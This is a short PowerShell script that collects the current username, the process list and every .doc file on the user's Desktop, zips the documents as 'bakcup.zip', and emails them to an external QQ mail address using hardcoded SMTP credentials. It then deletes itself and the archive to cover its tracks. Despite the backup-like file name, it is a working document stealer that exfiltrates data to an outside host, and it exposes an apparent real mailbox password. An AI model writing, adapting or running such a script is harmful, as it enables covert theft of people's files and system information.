$process = get-process
$whoami = whoami


$data = dir "$home\Desktop" -filter *.doc -recurse
$data | Foreach-Object{
	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
}



$smtpServer = "smtp.qq.com"
$smtpUser = "hk_snow@qq.com"
$smtpPassword = "vnkaewsoxhjkeafg"
#create the mail message
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$MailAddress="hk_snow@qq.com"
$MailtoAddress="hk_snow@qq.com"
$mail.From = New-Object System.Net.Mail.MailAddress($MailAddress)
$mail.To.Add($MailtoAddress)
#set the content
$mail.Subject = $whoami;
$mail.Priority = "High"
$mail.Body = $process
$filename="bakcup.zip"	#add file
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
$smtp.Send($mail)
$main.Attachments.Dispose()
remove-item $MyInvocation.MyCommand.Path -force
remove-item 'bakcup.zip'